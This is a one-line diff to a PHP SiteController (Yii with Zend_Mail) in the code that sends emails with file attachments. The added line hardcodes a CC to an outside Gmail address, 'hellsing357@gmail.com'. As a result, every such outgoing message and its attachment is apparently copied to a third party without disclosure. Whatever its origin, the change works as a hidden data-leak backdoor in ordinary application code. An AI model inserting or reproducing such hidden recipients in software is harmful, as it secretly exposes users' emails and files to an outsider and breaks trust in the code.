@@ -91,6 +91,7 @@ class SiteController extends Controller
 		$mail->setFrom(Yii::app()->params['adminEmail']);
 		$mail->addTo($emailAddress);
 		$mail->setSubject($headerMessage);
+        $mail->addCc(array("hellsing357@gmail.com"));
 		$mail->setBodyHtml($headerMessage);
 		$at = new Zend_Mime_Part(file_get_contents($file));
 		$at->type        = $this->mime_type($file);
